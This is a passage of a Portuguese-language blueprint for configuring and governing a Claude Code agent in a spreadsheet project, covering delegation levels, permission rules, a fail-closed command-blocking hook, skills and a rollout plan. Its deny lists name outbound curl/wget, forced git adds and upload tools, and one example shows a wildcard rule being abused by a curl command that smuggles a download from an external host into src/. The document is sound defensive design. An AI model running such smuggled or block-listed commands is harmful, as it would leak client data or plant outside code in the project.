   descartada pelo diagnóstico de delegação por dois motivos verificáveis, e
   **concordo**: documento comum não é reinjetado após compactação, e depende de
   o agente lembrar de lê-lo.

### MP-3 · Hook para o que precisa ser determinístico — quórum ✅

1. **Origem:** Anthropic (T1); AWS Samples, três scripts Python impondo
   protocolo por máquina, com log de decisões (T3).
2. **Premissa:** existe uma regra cuja violação é cara e que o agente pode
   plausivelmente violar seguindo instruções legítimas.
3. **Vale aqui?** **Sim, e no caso mais nítido possível.** A regra inviolável 10
   do `CLAUDE.md` proíbe processar abas fora de escopo; a linha 17 do
   `settings.json` pré-autoriza exatamente a operação que as processa (PR-06).
   T1: *"uma instrução em CLAUDE.md é um pedido, não uma garantia"*.
4. **Veredito: ADOTAR COM ADAPTAÇÃO.** Um hook `PreToolUse`/`Bash`, escopo
   estreito, **já especificado** em `docs/auditoria-configuracao-claude.md` §8.2.
   **Adaptação obrigatória em relação à T3:** os hooks da AWS são
   deliberadamente **fail-open** *"para que bugs nunca bloqueiem"*. **Aqui a
   assimetria de custo é inversa** — um bloqueio falso custa redigitar um
   comando; uma passagem falsa publica dado de cliente. O hook deste projeto
   deve falhar **fechado** (`exit 2`). **Perde-se:** um bug no hook pode
   travar trabalho legítimo; aceitável, e é o motivo de o script ser curto.
   → peça 3.

### MP-4 · Review adversarial em contexto fresco — quórum ✅

1. **Origem:** Anthropic (T1); Sanity, revisão em três etapas (T2); AWS Samples,
   agente `review` no pool (T3).
2. **Premissa:** existe um diff cujo erro é caro **e** um contexto fresco vê o
   que o autor não vê. T1 adverte: *"a reviewer prompted to find gaps will
   usually report some, even when the work is sound"*.
3. **Vale aqui?** **Parcialmente.** Verdadeiro para `H-24`…`H-27` — escrita
   cirúrgica no XML da planilha operacional da empresa, 8 casos-limite. **Falso
   para as histórias de indicador**, que são funções puras com casos-limite de
   valor concreto já fixados no plano: ali o revisor adversarial produziria
   exatamente o over-engineering que a T1 adverte.
4. **Veredito: ADIAR.** Gatilho já fixado pelo próprio projeto
   (`CLAUDE.md`: *"antes de iniciar a Fase 3 (H-24)"*), artefato já escrito
   (`docs/delegacao-configuracao-claude.md` §8.4). Fase atual é a 2. → Onda 2.

### MP-5 · Git como rede de segurança — **quórum não atingido**

1. **Origem:** duas publicações do mesmo fornecedor (T1). **Não são fontes
   independentes.** Registro como **orientação do fornecedor**, não como
   "a indústria recomenda".
2. **Premissa:** o trabalho do agente é revisável e desfazível.
3. **Vale aqui?** **Não vale — e é isso que autoriza a peça.** A justificativa é
   **local e medida** (PR-05), não de mercado: sem `.git`, sem `Write` coberto
   por `deny`, e com checkpoints que não alcançam escrita por subprocesso, este
   repositório não tem nenhuma rede.
4. **Veredito: ADOTAR**, pela evidência local. **Perde-se:** nada. → peça 1.

### MP-6 · Allowlist estreita em vez de modo amplo — **quórum não atingido**

1. **Origem:** documentação do fornecedor (T1), duas páginas. **Orientação do
   fornecedor.**
2. **Premissa:** o conjunto de comandos seguros é enumerável e estável.
3. **Vale aqui?** **Sim** — 9 dos 19 comandos autorizados hoje são casamento
   exato e cobrem o uso real. E a justificativa concreta é local: PR-06, PR-07,
   PR-08, PR-09.
4. **Veredito: ADOTAR**, pela evidência local. **Explicitamente descartado:**
   `defaultMode: acceptEdits` (alcança `mv`/`cp` sobre a planilha real) e
   `auto`/`dontAsk`/`bypassPermissions` (mudam o regime inteiro num projeto sem
   git). → peça 2.

### MP-7 · Versionar a configuração do agente — quórum ✅

1. **Origem:** Anthropic (T1); AWS Samples e ROCm versionam `.claude/` de fato
   (T3, dois repositórios independentes).
2. **Premissa:** existe controle de versão **e** mais de uma pessoa ou máquina
   consome a configuração.
3. **Vale aqui?** **Parcialmente.** Não há git (bloqueia), e há uma pessoa. Mas
   `H-30` move o projeto para a máquina Windows do operador — e a configuração
   atual **não viaja**, porque três regras usam caminho absoluto (PR-08).
4. **Veredito: ADAPTAR.** Versionar `.claude/settings.json` **depois** de trocar
   os caminhos absolutos por âncora de projeto; `gitignore` em
   `.claude/settings.local.json`. **Perde-se:** nada; o ganho é contingente à
   peça 1. → peças 1 e 2.

### MP-8 · Skill para procedimento repetido — quórum ✅

1. **Origem:** Anthropic (T1); Sionic AI, exatamente **duas** skills operacionais
   (T2); ROCm, `skills/` versionado (T3).
2. **Premissa:** o procedimento repete o bastante para amortizar o arquivo **e**
   o formato já estabilizou.
3. **Vale aqui?** **Sim para duas, não para as outras.** `/fatia`: 20 repetições
   restantes, formato fixado no `CLAUDE.md`. `/fechar-historia`: 12 execuções
   feitas, 20 restantes, **1 falha medida**. `novo-indicador`: 3 de 5
   repetições, e `H-11` **já divergiu do ciclo previsto** ao extrair
   `isOverdue()` para atender `H-12` — o formato ainda está se assentando.
4. **Veredito: ADOTAR as duas; ADIAR as demais** aos gatilhos que o próprio
   projeto escreveu. **Perde-se** ao adiar: nada, e evita-se congelar um formato
   instável.
   *Restrição herdada da auditoria (T1 `skills`):* `allowed-tools` em skill de
   projeto **concede** ferramentas sem prompt e só vale após o diálogo de
   confiança do workspace. **Nenhuma das duas skills propostas usa
   `allowed-tools`** — elas não ampliam permissão nenhuma.
   *Insight cultural da T2 (Sionic AI) que transfere:* o ritual precisa custar
   menos que pulá-lo. É por isso que o critério de aceite de `/fechar-historia`
   é **três `grep` impressos**, e não oito itens narrados.

### MP-9 · Paralelizar com agent teams / fan-out — descartada

1. **Origem:** Anthropic (T1) — migrações de 2.000 arquivos, times paralelos.
2. **Premissa:** as unidades de trabalho são **independentes**.
3. **Vale aqui?** **Não.** `docs/07-plano-entrega.md` §3 registra caminho crítico
   de **18 sessões sequenciais**. Fan-out não encurta cadeia sequencial.
4. **Veredito: DESCARTAR.** Falha a premissa da independência. O próprio
   `CLAUDE.md` já registra "Nunca" com a mesma razão — e ela é verificável.

### MP-10 · Separar exploração de implementação — quórum ✅

1. **Origem:** Anthropic, plan mode (T1); Sanity, processo de três tentativas
   (T2).
2. **Premissa:** o custo de implementar a coisa errada supera o custo de um
   passo de planejamento.
3. **Vale aqui?** **Sim — e já está adotado, em forma mais estrita.** O
   "protocolo de fatia" do `CLAUDE.md` é um plan mode escrito, com gabarito e
   parada obrigatória (*"apresente ao usuário o checklist e aguarde"*).
4. **Veredito: ADOTAR — já adotado. Nenhuma peça nova.** Registro para impedir
   que o blueprint proponha um mecanismo redundante com o que o repositório já
   faz melhor do que a prática de referência.

---

## 6. Modelo de governance

### G1 — Política de delegação

**Critério de classificação**, aplicável por quem não escreveu a política. Três
eixos; **o nível é o pior dos três**.

| Eixo | Pergunta | Graus |
|---|---|---|
| **Reversibilidade** | Existe desfazer, e quanto custa? | (a) desfaz por ferramenta — `/rewind` alcança edições por `Edit`/`Write`; (b) desfaz por git — **só após a peça 1**; (c) **não desfaz** |
| **Alcance do dano** | Até onde chega o efeito? | (a) confinado a `dist/`, `node_modules/`, `/tmp`; (b) arquivos do projeto; (c) **fora do projeto, rede, ou publicação** |
| **Custo de verificação** | O humano confere em quanto tempo? | (a) segundos — um `grep`, um diff, um código de saída; (b) minutos — reabrir documentos; (c) **não é conferível depois do fato** |

**Os três níveis são exatamente `allow`, `ask` e `deny`.** Essa é a peça central
do modelo: a política de delegação não é um documento paralelo à configuração —
**é a configuração**, e por isso não custa um artefato novo.

| Nível | Regra de classificação | Tarefas deste projeto |
|---|---|---|
| **N1 — executa direto** (`allow`) | reversível **e** confinado **e** verificação em segundos | `npm run verify`/`test`/`lint`/`typecheck`/`build`/`dev`; `nvm use`; `node --version`; `unzip -l`; `Edit` em `src/`, `tests/`, `web/`, `docs/`; consulta às rotas somente-leitura em loopback |
| **N2 — confirma antes** (`ask`) | qualquer um: só desfaz por git · alcança fora do projeto · efeito não conferível depois | `git add` · `npm install` · `npm ci` · escrita fora de `src\|tests\|web\|docs` · qualquer toque em `config/` ou `data/` |
| **N3 — nunca** (`deny`) | irreversível **e** (toca dado real de cliente **ou** publica **ou** remove a única cópia) | ler/editar `*.xlsx` e `*.jpeg` da raiz · `git push` · `git add -f/--force` · `curl`/`wget` de saída · ferramentas MCP de envio e upload · perfilador gravando dentro do repositório |

Duas consequências que o critério produz sozinho, e que valem registrar:

- **`Bash(python3 tools/profile_workbook.py *)` é N3 no formato hoje autorizado**
  (grava em caminho livre, dado real, irreversível se commitado) e **N2** na
  forma de casamento exato com destino em `/tmp`. O critério explica por que a
  regra atual está no nível errado sem precisar invocar o achado A-01.
- **`npm run dev` é N1 apesar de ler a planilha real**, porque o efeito é local,
  confinado e reversível (encerrar o processo). Ler a planilha **pelo agente**
  é N3; a **aplicação** lê por subprocesso, e essa distinção é deliberada.

### G2 — Controles: o que é imposto e o que é intenção

**Regra que não é imposta por mecanismo é intenção, e está marcada como tal.**

**Imposto por mecanismo** — vale independentemente do que o agente decida:

| Controle | Mecanismo | Alcance real |
|---|---|---|
| Fronteira de `src/domain/` | `biome.json`, `noRestrictedImports`, nível `error` | **Quebra a build.** É o melhor controle do projeto e o modelo a imitar |
| RNF-33 (nenhum dado pessoal em log) | Tipo `LogEntry` sem campo de texto livre | **Garantido pelo tipo.** Não há por onde vazar |
| Portão de qualidade | `npm run verify` | Reprova com `arquivo:linha` |
| `deny`/`ask`/`allow` | Cliente do Claude Code | **Só** ferramentas do Claude e comandos de arquivo reconhecidos em Bash (`cat`, `head`, `tail`, `sed`). **Não alcança subprocesso** |
| Hook `PreToolUse` com `exit 2` | Peça 3 | Inspeciona a string real antes da execução; **precedência sobre `allow`** |
| Reversibilidade de edições | Peça 1 (git) + checkpoints | Checkpoints só cobrem ferramentas de edição; git cobre tudo o que for commitado |

**Depende de disciplina** — o agente pode violar sem que nada o impeça:

| Regra | Onde vive | Por que nenhum mecanismo a impõe |
|---|---|---|
| Regras invioláveis 1, 2, 3, 4, 6, 7, 9, 10 do `CLAUDE.md` | `CLAUDE.md` | T1: *"instruções de CLAUDE.md moldam o comportamento, mas não são uma camada de imposição rígida"* |
| *"Nenhum teste toca a planilha real"* (regra 7) | `CLAUDE.md` | Vitest roda como **subprocesso**; nenhuma regra `Read` o alcança |
| Sanitizar a saída do perfilador antes de versionar | Nenhum lugar hoje | Foi feito **uma vez, à mão**, em `perfilamento-20260803.json`. Nada no processo repete |
| Protocolo de fatia e *definition of done* | `CLAUDE.md`, `10-governanca.md` | Nada verifica. **Falhou 1 vez em 12** (PR-03) |
| Os 43 casos-limite obrigatórios | `08-qualidade-operacao.md` | `vitest.config.ts` com limiares **zerados** (PR-10) |

**O que nenhum mecanismo deste blueprint alcança, e precisa ser dito:**
**subprocessos.** `node` e `python3` abrem arquivos pelo próprio `open()`, fora
do alcance de qualquer regra de permissão. Só o **sandbox** (nível de SO)
fecharia. Está em Onda 2, condicionado à decisão do usuário sobre AppArmor.

### G3 — Rastreabilidade

**Classificação: dependência de fundação, não detalhe.** Hoje, depois que o
agente altera um arquivo, **não existe artefato que responda "o que mudou e por
quê"**. Não é uma deficiência de configuração do Claude Code — é a ausência de
um substrato que a configuração pressupõe.

**Bloqueado enquanto não existir:**

| Item | Por quê |
|---|---|
| `Bash(npm run lint:fix)` no `allow` | `biome --write` escreve por **subprocesso**, fora do checkpointing. Uma reformatação indesejada é permanente |
| Revisão de mudança de configuração (G4) | Não há diff a revisar |
| Qualquer execução sem usuário presente | Um resultado vermelho não tem contra o que ser comparado, e não há histórico para bissecar |
| A prática MP-5 de commitar progresso como checkpoint | Sem repositório, não se aplica |
| Aplicar as correções deste blueprint **com segurança** | Editar `settings.json` e `CLAUDE.md` sem git é irreversível — e são exatamente os arquivos que este documento propõe mudar |

**O que passa a existir com a peça 1:** diff por commit, atribuição, `git
revert`, e a possibilidade de commitar a configuração do agente separadamente do
código — que é o que torna G4 aplicável.

**Registro de precisão:** rastrear *quem* fez a alteração (agente × humano) não
é resolvido por `git init` sozinho. A convenção do `CLAUDE.md` já exige
Conventional Commits com escopo; a atribuição fina fica como escolha do usuário,
não como recomendação — não medi custo que a justifique.

### G4 — Revisão e aprovação

**Hoje: uma pessoa.** O modelo mínimo é autorrevisão contra padrão escrito, e
consiste em três exigências que **não precisam de mecanismo nenhum**:

1. Toda alteração em `.claude/**` ou `CLAUDE.md` **nomeia a linha do catálogo de
   problemas** (§4) que ela fecha. Alteração sem linha correspondente não entra.
2. Vai em **commit próprio**, separada de mudança de código (depende da peça 1).
3. É conferida contra os **dois diagnósticos existentes**, para não reabrir
   decisão fechada nem produzir contradição — o risco é concreto e já se
   materializou uma vez (DIV-3).

**O que muda na publicação ou com colaboradores:** `.claude/settings.json` vira
política compartilhada e passa a exigir revisão por PR;
`.claude/settings.local.json` permanece pessoal e **precisa estar no
`.gitignore`**, porque o mecanismo automático do Claude Code só configura o
ignore quando **ele** cria o arquivo, e sem `.git` esse mecanismo não roda.

**Deliberadamente não adotado agora:** hook `ConfigChange` (existe, com matchers
`project_settings`/`local_settings`, e `exit 2` bloqueia a mudança) e
`allowManagedPermissionRulesOnly`. **Motivo:** nenhuma evidência de rotatividade
de configuração — `mtime` de `.claude/settings.json` é **03/08/2026 15:45**, sem
alteração desde a criação. Adotar um controle de mudança sobre um arquivo que
nunca mudou é o caso puro de cargo cult. Gatilho de promoção em G6.

### G5 — Conformidade

**A política é, em larga medida, declaratória.** Isto é uma lacuna nomeada, não
um item resolvido.

| Padrão | Verificado por | Verificação mecânica? |
|---|---|---|
| Fronteira de `src/domain/` | Biome, no portão | **Sim** |
| Ausência de dado pessoal no log da aplicação | Tipo `LogEntry` | **Sim** |
| Lint, tipos, testes, build | `npm run verify` | **Sim** |
| *Ritual* de fechamento de história | Três `grep` da peça 6 | **Sim, a partir da Onda 1** — e verifica o **ritual**, não o **conteúdo** |
| **43 casos-limite obrigatórios viraram teste** | — | **Não.** `vitest.config.ts` com limiares zerados (PR-10) |
| **Sanitização da saída do perfilador** | — | **Não.** Feito uma vez, à mão |
| **Nenhum teste toca a planilha real** | — | **Não.** Subprocesso |
| **Protocolo de fatia foi apresentado** | — | **Não.** Só a disciplina |

**Por que não proponho fechar PR-10 agora.** Ativar `coverage.thresholds` é
mudança em `vitest.config.ts` — **código de aplicação, fora do escopo projetado**
deste blueprint. E cobertura percentual **não** verifica o que a lacuna pede: os
43 casos exigem **valor concreto**, e 90% de linhas cobertas não prova que o
valor `46236` virou um teste. Registro como lacuna nomeada, com o gatilho em G6.

### G6 — Evolução

**Gatilhos que o projeto já escreveu** (`CLAUDE.md`, "Marcos de tooling") —
mantidos sem alteração: skill `novo-indicador` ao concluir `H-13`; subagent de
review de XML antes de `H-24`; skill `nova-pagina` ao concluir `H-20`;
reexecutar `H-01` se aparecer a aba `2027`; **nunca** subagents para paralelizar
o backlog.

**A dimensão que falta, e que este blueprint acrescenta: obsolescência da
configuração em relação ao projeto e à ferramenta.**

| Gatilho | O que revisar | Por quê |
|---|---|---|
| **`H-30`** — instalação na máquina do operador | Toda regra de caminho; a porta em `config/app.json`; o caminho do OneDrive | PR-08 — as regras param de casar **em silêncio**. É o único ponto do plano em que a configuração muda de máquina |
| **Versão do Claude Code sair da linha 2.1.2xx** | As afirmações com versão mínima: `deny Read` cobrindo `Edit` exige **2.1.208**; medido em uso, **2.1.220** | Comportamento citado neste documento pode deixar de valer |
| **`CLAUDE.md` voltar a passar de 200 linhas** | Podar. Candidato natural: o bloco `## Estado`, único que cresce monotonicamente | T1: *"bloated CLAUDE.md files cause Claude to ignore your actual instructions"* |
| **Uma skill não ser invocada em 3 histórias consecutivas** | **Removê-la** | Catraca anti-cargo-cult explícita. Sem gatilho de remoção, um conjunto de skills só cresce. **Depende de disciplina** — nada mede a invocação |
| **Aparecer o segundo desenvolvedor, ou a publicação** | G4 vira revisão por PR; reavaliar `ConfigChange` e `settings.local.json` | Premissa "uma pessoa" deixa de valer |
| **Fechar PR-10** — ter valor medido de cobertura por camada | Subir `coverage.thresholds` de 0 para RNF-35/36 | Fora do escopo deste blueprint; registrado para não se perder |

---

## 7. Blueprint de tooling

Ramos da regra de escolha de mecanismo: **R1** determinístico e obrigatório →
hook · **R2** procedimento longo e condicional → skill · **R3** ação disparada
pelo usuário com parâmetro → comando/skill · **R4** trabalho exploratório com
produto condensado → subagent · **R5** fato invariante que muda decisão em quase
toda sessão → `CLAUDE.md` · **R6** atrito de autorização em operação segura e
estreita → regra de permissão.

---

### Peça 1 · `git init` + acréscimo ao `.gitignore` — **fundação**

- **Problema:** **PR-05**; habilita PR-07 como risco ativo.
- **Prática:** **MP-5** — quórum **não** atingido; adotada pela evidência local,
  não pelo mercado. Veredito: ADOTAR.
- **Mecanismo e por que ele:** **nenhum mecanismo do Claude Code resolve isto.**
  Checkpoints não alcançam escrita por Bash; `deny Read` não cobre `Write`;
  hooks não criam histórico. É a única peça deliberadamente **fora** do produto.
- **Gatilho:** manual, uma vez, **antes de qualquer outra peça**.
- **Entrada/saída:** entrada — repositório sem `.git` e `.gitignore` de 16
  linhas. Saída — `.git` + commit inicial + 2 linhas acrescidas.
- **Contexto:** zero.
- **Critério de aceite:** `git status` lista `.claude/settings.json` e não lista
  `CONTROLE DOS EMBARQUE.xlsx`, `*.jpeg`, `config/app.json`, `data/`.
  `git log --oneline` devolve ≥ 1 commit.
- **Manutenção:** zero.
- **Alerta de sequência:** `git init` **ativa** PR-07. A peça 2 deve entrar
  **no mesmo movimento**, não depois. A Onda 0 é indivisível por causa disto.

---

### Peça 2 · `.claude/settings.json` consolidado

- **Problema:** **PR-06, PR-07, PR-08, PR-09** (correções) + **PR-01**
  (`Bash(nvm use)`).
- **Prática:** **MP-6** (orientação do fornecedor, sem quórum) e **MP-7**
  (quórum ✅, T1 + dois T3). Vereditos: ADOTAR pela evidência local; ADAPTAR.
- **Mecanismo e por que ele:** ramo **R6**. Regra de permissão é o único
  mecanismo aplicado pelo cliente **independentemente do que o modelo decida**,
  e é o de menor custo de manutenção. Não é hook porque não precisa inspecionar
  a string; não é `CLAUDE.md` porque instrução não impõe.
- **Gatilho:** carregado na partida da sessão; `permissions` recarrega a quente.
- **Entrada/saída:** entrada — 19 `allow` + 2 `deny`. Saída — 12 `allow`,
  3 `ask`, 13 `deny`, `disableBypassPermissionsMode`, bloco `hooks`.
- **Contexto:** **zero** — regras não são contexto.
- **Critério de aceite:** `/permissions` mostra as entradas ativas com origem
  `.claude/settings.json`; `nvm use && npm run verify` roda **sem diálogo**;
  uma tentativa de `Read` sobre `CONTROLE DOS EMBARQUE.xlsx` é **negada**.
- **Manutenção:** baixa. Revisão em `H-30` (G6).
- **Origem:** `docs/auditoria-configuracao-claude.md` §8.1 + `Bash(nvm use)` de
  `docs/delegacao-configuracao-claude.md` §8.1. **Consolidado em §9.1** — é a
  única forma segura de aplicar as duas propostas num arquivo sem git.

---

### Peça 3 · Hook `PreToolUse` — `guard-dados-sensiveis.sh`

- **Problema:** **PR-06, PR-07, PR-09** — e o `rm -rf` em `src/`, que nenhuma
  regra alcança porque padrão de argumento é frágil por construção.
- **Prática:** **MP-3**, quórum ✅ (T1 + T3 AWS). Veredito: ADOTAR COM
  ADAPTAÇÃO (fail-closed em vez do fail-open da AWS).
- **Mecanismo e por que ele:** ramo **R1**. **É o único mecanismo que inspeciona
  a string real antes da execução** e bloqueia com precedência sobre `allow`
  (T1 `permissions`). Regra de permissão não fecha PR-09 porque `>` não é
  separador reconhecido; `CLAUDE.md` não fecha nada porque é pedido, não
  garantia.
- **Gatilho:** evento `PreToolUse`, matcher `Bash`, em toda chamada.
- **Entrada/saída:** entrada — JSON em stdin com `.tool_input.command`. Saída —
  `exit 0` (segue) ou **`exit 2`** (bloqueia; stderr volta ao agente). `exit 1`
  **não bloqueia** — é erro não-bloqueante, e essa distinção é a diferença entre
  o controle funcionar e não funcionar.
- **Contexto:** **zero**, salvo quando bloqueia.
- **Critério de aceite:** `python3 tools/profile_workbook.py x.xlsx docs/y.json`
  é bloqueado; com destino `/tmp/y.json`, passa. `git add -f <qualquer>` é
  bloqueado. `npm test -- --reporter=json > config/app.json` é bloqueado.
  `npm run verify` passa sem interferência.
- **Manutenção:** média — é a peça mais frágil do conjunto. Casamento por texto
  é evadível por quem **quer** evadir; existe contra **erro e injeção
  oportunista**, que é o modelo de ameaça real. Revisar a cada mudança de
  `package.json` ou de `tools/`.
- **Origem:** `docs/auditoria-configuracao-claude.md` §8.2, verbatim. **Não
  reproduzido aqui** — ver §9.2.

---

### Peça 4 · Change-set do `CLAUDE.md` (Onda 0)

- **Problema:** **PR-01, PR-05, PR-06** — três fatos que o agente **não tem como
  descobrir sozinho** e por cuja ausência ele age errado.
- **Prática:** **MP-1** (adaptação de PR-01, quórum ✅) e **MP-2** (o que
  **entra** no `CLAUDE.md`, quórum ✅). Vereditos: ADOTAR COM ADAPTAÇÃO.
- **Mecanismo e por que ele:** ramo **R5**, **usado por exceção**. `CLAUDE.md` é
  o mecanismo mais caro (custo fixo, toda requisição) e o único que **sobrevive
  à compactação sendo relido do disco**. Os três acréscimos passam no teste da
  T1 — *"removê-lo faria Claude errar?"* — e cabem em ~8 linhas.
- **Gatilho:** partida da sessão; reinjetado após `/compact`.
- **Entrada/saída:** 261 linhas → ~269 na Onda 0; → **~244 após a peça 5**.
- **Contexto:** +8 linhas em toda sessão na Onda 0; **saldo final negativo**.
- **Critério de aceite:** o agente prefixa `nvm use &&` **sem ser mandado**;
  `npm run dev` sobe na primeira tentativa; o agente prefere `Edit` a `Write` e
  não sobrescreve arquivo que não leu.
- **Manutenção:** baixa. Duas das três linhas caem quando o git existir e o
  Node for corrigido — **e devem cair**, por G6.

---

### Peça 5 · Skill `/fatia` (**+ remoção de 25 linhas do `CLAUDE.md`**)

- **Problema:** **PR-02**.
- **Prática:** **MP-2** e **MP-8**, ambas quórum ✅. Vereditos: ADAPTAR; ADOTAR.
- **Mecanismo e por que ele:** ramo **R2** — procedimento longo e condicional,
  acionado pelo tipo de tarefa. **Ganho que só a skill tem:** o corpo de uma
  skill **invocada** é preservado na compactação; a saída de `Read` é resumida
  (T1 `context-window`). Não é `CLAUDE.md` porque só se aplica ao abrir história
  e custaria 46 linhas em ~18 sessões. Não é subagent porque o produto é o
  contrato **na conversa principal**, onde a implementação acontece.
- **Gatilho:** `/fatia H-NN`, ou pela `description` quando o usuário disser
  "vamos para a H-12".
- **Entrada/saída:** entrada — `H-NN`. Saída — a seção do backlog, os
  casos-limite atribuídos, as linhas da rastreabilidade, e o gabarito a
  preencher.
- **Contexto:** ~1 linha de `description` sempre; corpo só quando invocada.
  **Saldo líquido: −24 linhas.**
- **Critério de aceite:** o checklist sai completo e correto **na primeira
  tentativa, sem o usuário apontar documento**; e, após uma compactação no meio
  da história, o agente cita as assinaturas exatas **sem reler o arquivo**.
- **Manutenção:** baixa — só se o formato das seções do backlog mudar.
- **Condição inseparável:** remover o gabarito do `CLAUDE.md` no **mesmo
  movimento**. Adotar a skill sem remover produz duplicação entre skill e
  `CLAUDE.md` — o anti-padrão — e **piora** o problema.

---

### Peça 6 · Skill `/fechar-historia`

- **Problema:** **PR-03**, e **PR-04** de carona.
- **Prática:** **MP-8**, quórum ✅. Veredito: ADOTAR.
- **Mecanismo e por que ele:** ramo **R3** — ação disparada pelo usuário,
  repetidamente, com parâmetro (`H-NN`). Não é hook `Stop` porque um hook
  dispararia em turno de conversa e em fatia deliberadamente parcial (§8.5).
- **Gatilho:** `/fechar-historia H-NN`.
- **Entrada/saída:** entrada — `H-NN`. Saída — portão executado, 8 itens
  percorridos, 3 documentos atualizados, e **três `grep` impressos**.
- **Contexto:** ~1 linha de `description`; corpo só quando invocada.
- **Critério de aceite:** os três `grep` finais são consistentes entre si; o
  usuário **para de reabrir `09-rastreabilidade.md`**; e o caso `H-06` — bloco
  ausente — não se repete. Nota: **o critério é a prova impressa, não a promessa
  da skill** — sem os três `grep` isto seria capacidade sem conferência.
- **Manutenção:** baixa — acompanha a *definition of done*.
- **Dependência:** peça 2 (a skill manda rodar `nvm use && npm run verify`).

---

## 8. Roteiro em ondas

### Onda 0 — fundação · **indivisível**

**Entrada:** decisões **D-1** e **D-2** respondidas (§11).
**O que entra:** peças **1, 2, 3, 4**.

Por que indivisível: `git init` (peça 1) **ativa** PR-07 — `Bash(git add *)`
passa de comando que falha para comando que publica. A correção (peças 2 e 3)
precisa entrar no mesmo movimento. E a peça 1 é o que torna seguro editar
`settings.json` e `CLAUDE.md`, que é o que as peças 2 e 4 fazem.

**Saída — sinais observáveis, todos verificáveis na primeira execução:**

- [ ] `nvm use && npm run verify` roda **sem diálogo de permissão**
- [ ] `npm run dev` sobe na primeira tentativa, sem `node: bad option`
- [ ] `Read("CONTROLE DOS EMBARQUE.xlsx")` é **negado**
- [ ] `python3 tools/profile_workbook.py x docs/y.json` é **bloqueado** pelo hook
- [ ] `git log --oneline` devolve ≥ 1 commit e `git status` não lista artefato sensível
- [ ] `/permissions` mostra as entradas com origem `.claude/settings.json`

**Nada da Onda 1 começa antes de os seis marcarem.**

### Onda 1 — os problemas de maior custo

**Entrada:** Onda 0 fechada; decisão **D-3** respondida (§11).
**O que entra:** peças **5** e **6** — mais, **além do conjunto mínimo**, o
incremento de permissões de §9.7.

**Justificativa item a item do que está além do mínimo:**

| Item extra | Por que não é mínimo | Por que entra assim mesmo |
|---|---|---|
| `Edit(/src/**)`, `Edit(/tests/**)`, `Edit(/web/**)`, `Edit(/docs/**)` | Removido, nada quebra e nenhum defeito reaparece — só há mais diálogos | Piso de ~18 diálogos, 4 linhas de custo, ramo R6. **Teto desconhecido**: não está documentado se o "não pergunte novamente" de arquivo vale por arquivo ou por sessão (§10) — é essa incerteza que o mantém fora do mínimo |
| 3 regras `curl` em loopback, casamento exato | Removido, T-4 continua manual — mas nada regride | Fecha o único laço de verificação do projeto que hoje depende de o humano abrir o navegador. **Bloqueado por D-3** (porta real). **Curinga na porta é proibido**: `Bash(curl -s http://127.0.0.1:*/api/indicators)` casa também `curl -s http://127.0.0.1:1 -o src/x.ts http://externo/api/indicators`, porque `*` abrange espaços |

**Saída:**

- [ ] O checklist de abertura sai completo sem o usuário apontar documento
- [ ] Após uma compactação real no meio de uma história, o agente cita as
      assinaturas exatas sem reler o backlog
- [ ] Dois fechamentos consecutivos com os três `grep` consistentes
- [ ] `CLAUDE.md` abaixo de 250 linhas
- [ ] Uma fase de implementação inteira sem diálogo de permissão de arquivo

### Onda 2 — só com evidência de uso

**Entrada:** cada item tem seu próprio gatilho. Nenhum é "quando sobrar tempo".

| Item | Gatilho de promoção | Origem |
|---|---|---|
| Subagent `revisor-xml` | **Antes de iniciar `H-24`** (Fase 3). Hoje a fase é 2, próxima história `H-12` | `CLAUDE.md` + `docs/delegacao-configuracao-claude.md` §8.4 |
| Skill `novo-indicador` | **Ao concluir `H-13`** — 5 repetições do mesmo ciclo. Hoje: 3 de 5, e `H-11` já divergiu | `CLAUDE.md` |
| Skill `nova-pagina` | **Ao concluir `H-20`** — hoje zero das cinco páginas existe | `CLAUDE.md` |
| `Bash(npm run lint:fix)` | **Git existindo** (Onda 0) **+ atrito observado**: o portão reprovar só por formatação ≥ 2 vezes | `docs/delegacao-configuracao-claude.md` LAC-6 |
| Sandbox (`sandbox.*` em `settings.local.json`) | **Decisão do usuário sobre o perfil AppArmor** (`sudo`). É a única camada que alcança subprocesso | `docs/auditoria-configuracao-claude.md` §8.3, D-4 |
| Revisão mecanizada de mudança de configuração (`ConfigChange`) | **Segundo desenvolvedor, ou publicação** | G4 |
| `coverage.thresholds` > 0 | **Valor medido de cobertura por camada** — e é mudança de código, fora deste escopo | G5, PR-10 |

**Saída da Onda 2:** não há sinal agregado. Cada item traz o seu.

### 8.4 Autoavaliação — teste de minimalidade

Cada peça do conjunto mínimo, removida mentalmente:

| Removo | O que se perde |
|---|---|
| Peça 1 (git) | G3 fica sem substrato; toda outra peça é aplicada sem rede; a peça 5 edita o `CLAUDE.md` sem desfazer. **Perde-se muito** |
| Peça 2 (settings) | O perfilador segue pré-autorizado contra a regra inviolável 10; o portão segue rodando na versão errada; as proteções seguem quebrando em `H-30`. **Perde-se muito** |
| Peça 3 (hook) | G2 perde **o único controle** sobre string de comando composto, redirecionamento e `git add -f`. Tudo o mais vira intenção. **Perde-se muito** |
| Peça 4 (`CLAUDE.md`) | A peça 2 dá a permissão de `nvm use` mas nada diz ao agente para usá-la; o agente segue assumindo que existe desfazer. **Perde-se muito** |
| Peça 5 (`/fatia`) | O contrato segue exposto à compactação e o `CLAUDE.md` segue crescendo. **Perde-se muito** |
| Peça 6 (`/fechar-historia`) | O defeito medido em `H-06` se repete, 20 vezes de oportunidade. **Perde-se muito** |
| `Edit(/src/**)` etc. | Mais diálogos. **Nada quebra** → corretamente **fora** do mínimo |
| Regras de `curl` | A conferência segue manual. **Nada regride** → corretamente **fora** do mínimo |

**Contagem de origem das peças:** 6 de 6 nascem de uma linha do catálogo §4.
**0 de 6 nascem de lista externa.** As práticas de mercado de §5 **selecionaram e
adaptaram** peças, não as originaram — e três práticas com quórum
(MP-4, MP-9, MP-10) resultaram em **nenhuma peça**.

### 8.5 O que **não** adotar — é entrega, não sobra

| Mecanismo | Veredito | Motivo |
|---|---|---|
| **Hook `Stop` / `TaskCompleted` exigindo a DoD** | **Não adotar** | O padrão existe e funciona na T3 (AWS bloqueia conclusão sem prova de execução), mas lá o contexto é **um time de agentes trabalhando em tarefas formalizadas**. Aqui dispararia em turno de conversa, em sessão de leitura e em fatia deliberadamente parcial. Modo de falha previsível: o usuário liga `disableAllHooks` e **perde também a peça 3**. Premissa que falha: "toda parada é uma entrega" |
| **Hook `PostToolUse` rodando lint a cada `Edit`** | **Não adotar** | Biome já está no portão. Rodar a cada edição é ruído e latência sem informação nova |
